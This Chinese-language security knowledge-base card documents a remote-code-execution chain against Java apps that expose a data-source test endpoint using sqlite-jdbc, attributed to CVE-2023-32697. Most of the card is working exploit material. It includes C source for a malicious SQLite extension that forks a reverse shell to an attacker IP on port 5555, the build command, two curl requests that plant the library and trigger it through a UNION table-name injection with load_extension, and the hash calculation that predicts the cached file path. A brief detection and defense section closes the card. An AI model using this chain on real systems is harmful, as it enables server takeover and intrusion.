---
id: web-java-deserialization-sqlite-jdbc-resource-landing-union-load-extension-rce
title: sqlite-jdbc :resource 缓存落地恶意扩展 + 表名 UNION 注入 load_extension：CVE-2023-32697 完整 RCE 链
type: scenario
domain: web
path: web/java/deserialization
technique: sqlite-jdbc-resource-landing-union-load-extension
tags:
- java
- jdbc
- sqlite
- load-extension
- rce
- file-write
- cve-2023-32697
- reverse-shell
cve:
- CVE-2023-32697
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V343
  verified_at: '2026-11-08T22:13:32+08:00'
  notes: 已对照原文图01/02/03核对 type=3 SQLite 分支、getTableContent 表名拼接、111.db 的 user 表与 nc 5555 实测反连；CVE-2023-32697 为原文归因（NVD 区间 >=3.6.14.1,<3.41.2.2，原文未写故未设 affected_versions）；与两张既有 sqlite-jdbc 卡对比触发方式/环境/PoC 均不同（UNION 注入、未带 enable_load_extension、含扩展源码与实测），保留。
url: /docs/web/java/deserialization/web-java-deserialization-sqlite-jdbc-resource-landing-union-load-extension-rce/
draft: false
kb_aliases:
- sqlite-jdbc RCE
- CVE-2023-32697
- sqlite-jdbc-tmp 文件名预测
- load_extension 反弹 shell
- tableName UNION 注入
- 恶意 SQLite 扩展 sqlite3_extension_init
- JDBC 数据源测试 RCE
---

## 一句话结论

当 Java 应用把数据源测试的 `type`/`url`/`tableName` 全部交给用户控制时，可让 sqlite-jdbc 用 `jdbc:sqlite::resource:http://vps/poc.so` 把恶意 ELF 共享库下载并缓存到文件名可预测的 `/tmp/sqlite-jdbc-tmp-<URL.hashCode()>.db`（文中归因 CVE-2023-32697），再连接一个带 `user` 表的正常 SQLite 库并把 `tableName` 注入为 `user union select 1,load_extension('/tmp/sqlite-jdbc-tmp-<hash>.db') --`，由 SQLite 加载该扩展执行 `sqlite3_extension_init`，最终 fork 后反连 VPS 的 5555 端口得到 shell。

## 原理

- **参数完全可控**：`testDatasourceConnectionAble(JdbcBean)` 按 `jdbcBean.getType()` 分支，case 3 走 SQLite：`new SqliteDatasourceConnector(jdbcBean.getUrl())`，若 `tableName != null` 则 `getTableContent(tableName)`。`url` 与 `tableName` 都来自请求体，无白名单。
- **`:resource:` 的落地语义**：`jdbc:sqlite::resource:<http URL>` 让驱动先通过 HTTP 取到资源再以本地文件打开；缓存文件名为 `sqlite-jdbc-tmp-` + `new URL(url).hashCode()` + `.db`，同一 URL 的 hashCode 恒定，攻击者可离线算出精确路径。驱动不校验内容与扩展名，ELF 共享库即使命名为 `.db` 也能被后续 `load_extension` 按格式识别。文中将该可预测缓存文件问题归为 CVE-2023-32697。
- **表名拼接注入**：`getTableContent` 把 `tableName` 拼成 `select * from <tableName>`。SQLite 的 FROM 位置接受 UNION 结果，`user union select 1,load_extension('...') --` 使整句语法合法，`load_extension()` 在查询求值阶段被执行；无需分号堆叠。
- **load_extension 的执行模型**：SQLite 的 `load_extension(path)` 动态加载共享库并调用入口 `sqlite3_extension_init`；该环境中的 sqlite-jdbc 允许调用（文中未在最终请求里显式带 `enable_load_extension=true`，说明驱动/目标配置已放行）。扩展初始化函数里 `fork()` 出子进程，`socket/connect` 到攻击者 IP:端口，`dup2` 把 socket 接到 0/1/2，`execve("/bin/bash")`，形成反弹 shell。
- **为什么这条链完整**：`type/url/tableName` 三个字段分别提供「选择驱动」「落地载荷」「触发执行」，不需要目标上已有 .so、不需要上传点、不需要视图/触发器预置；第一发请求只落地，第二发请求完成注入与加载。
- **CVE 说明**：文中把「缓存文件名可预测」归因于 CVE-2023-32697，未给出受影响版本区间与修复版本；本卡按文中的归因记录，具体版本范围以官方公告为准。
- **边界**：目标不能出网访问攻击者 HTTP、`/tmp` 不可写、`tableName` 被白名单/参数化、`load_extension` 被禁用（`SQLITE_OMIT_LOAD_EXTENSION` 或驱动关闭扩展加载）、平台/架构与 .so 不匹配时链不成立。

## 触发条件

- Java 应用提供数据源连接测试/取表内容功能，请求体可控制 `type=3`、`url`、`tableName`。
- classpath 存在 sqlite-jdbc，且 `:resource:` 远程 URL 未被禁用。
- 应用服务器能出网访问攻击者 HTTP 服务（用于下载 .so 与正常 db 文件）。
- `/tmp`（或驱动临时目录）可写；SQLite 允许 `load_extension`；目标为与 .so 匹配的 Linux 架构。
- 存在一个含目标表（如 `user`）的正常 SQLite 库，或攻击者自己托管一个。

## 利用步骤

1. 准备恶意扩展 `poc.c`，实现 `sqlite3_extension_init`：fork 后 connect 攻击者 IP:5555，dup2 到标准输入输出，execve `/bin/bash`；`gcc -g -fPIC -shared poc.c -o poc.so` 编译，放到攻击者 HTTP 服务。
2. 本地计算缓存文件名：`new java.net.URL("http://vpsip:port/poc.so").hashCode()`，得到如 `-39093542`，对应路径 `/tmp/sqlite-jdbc-tmp--39093542.db`（负号与 `tmp-` 的连字符叠加成双横线）。
3. 请求 1：`{"type":3,"url":"jdbc:sqlite::resource:http://vpsip:port/poc.so","tableName":"security"}`，让驱动把 .so 缓存到上述可预测路径。
4. 准备并托管一个正常 SQLite 库（含 `user(username,password)` 表，如 `111.db`）；在攻击者侧启动 `nc -lnvp 5555`。
5. 请求 2：`{"type":3,"url":"jdbc:sqlite::resource:http://vpsip:port/111.db","tableName":"user union select 1,load_extension('/tmp/sqlite-jdbc-tmp--39093542.db')"}`，触发扩展加载。
6. `sqlite3_extension_init` 执行，nc 收到反连 shell（文中截图显示连接来源与 `ls` 输出 app.jar/bin）。

## PoC

```java
// 预测缓存文件名（对应 poc.so 的 URL）
String so = "http://vpsip:port/poc.so";
System.out.println("/tmp/sqlite-jdbc-tmp-" + new java.net.URL(so).hashCode() + ".db");
// 示例：/tmp/sqlite-jdbc-tmp--39093542.db
```

```c
// 最小恶意 SQLite 扩展（按文中行为重写的示意，未执行）
#include <sqlite3ext.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
SQLITE_EXTENSION_INIT1

int sqlite3_extension_init(sqlite3 *db, char **err, const sqlite3_api_routines *api) {
    SQLITE_EXTENSION_INIT2(api);
    if (fork() == 0) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in a = {0};
        a.sin_family = AF_INET;
        a.sin_port = htons(5555);
        a.sin_addr.s_addr = inet_addr("<attacker_ip>");
        if (connect(fd, (struct sockaddr *)&a, sizeof(a)) == 0) {
            dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
            execve("/bin/bash", NULL, NULL);
        }
        _exit(0);
    }
    return SQLITE_OK;
}
```

```bash
gcc -g -fPIC -shared poc.c -o poc.so
# 请求 1：落地 .so
curl -H 'Content-Type: application/json' -d '{"type":3,"url":"jdbc:sqlite::resource:http://vpsip:port/poc.so","tableName":"security"}' http://target/jdbc/connect
# 请求 2：表名 UNION 注入加载扩展
curl -H 'Content-Type: application/json' -d '{"type":3,"url":"jdbc:sqlite::resource:http://vpsip:port/111.db","tableName":"user union select 1,load_extension('\''/tmp/sqlite-jdbc-tmp--39093542.db'\'')"}' http://target/jdbc/connect
```

说明：扩展初始化逻辑按文中源码重写为最小示意；hash 值以实际 URL 计算为准，文中两次出现的 hash 值不一致，复现时应用同一 poc.so URL 计算。

## 变体与关联

- [[web-java-deserialization-sqlite-jdbc-table-name-select-injection-load-extension-rce]]：同 `select * from <tableName>` 注入 + `load_extension` sink，但该卡假设恶意 .so 已存在、使用 `(select load_extension(...))` 子查询并显式 `enable_load_extension=true`；本卡补上「用 `:resource:` 自落地 .so」与 UNION 注入、并给出恶意扩展源码与实测反连。
- [[web-java-deserialization-sqlite-jdbc-resource-url-tmp-file-write]]：同 `:resource:` 可预测临时文件机制，但该卡用「第二个 db + CREATE VIEW 劫持」触发，本卡用表名 UNION 直接调 `load_extension`，无需视图与第二个库。
- [[web-python-django-sql-explorer-load-extension-dll-rce]]、[[web-php-rce-pdo-sqlite-loadextension]]：跨语言同类 `load_extension` sink，可用本卡的扩展模板替换 msfvenom 生成的 elf-so。
- 变体：`.so` 可换 msfvenom `-f elf-so`；触发可换 `(select load_extension(...))`、视图/触发器；落地可换 `ATTACH DATABASE` 写文件或任意文件写。
- 边界：JDBC URL 白名单/禁 `:resource:`、表名白名单、扩展加载关闭、临时目录 noexec 或不可预测时链不成立。

## 检测与防御

- 防御：JDBC URL 只允许固定前缀与固定主机，禁止 `::resource:` 与用户自定义来源；`tableName` 来自 `sqlite_master` 白名单或严格校验，禁止拼进 SQL。
- 防御：连接层禁用 `enable_load_extension`，SQLite 编译 `SQLITE_OMIT_LOAD_EXTENSION`；数据源测试接口仅管理员可用并隔离在低权限容器，`/tmp` 用 noexec 挂载。
- 检测：JDBC URL 出现 `::resource:`、`sqlite-jdbc-tmp`；`/tmp` 下出现 `sqlite-jdbc-tmp-*.db` 且内容为 ELF；SQL 日志含 `load_extension`/`union select`；Java 进程异常外连 5555 等端口并 spawn `/bin/bash`；升级 sqlite-jdbc 修复 CVE-2023-32697 相关风险。
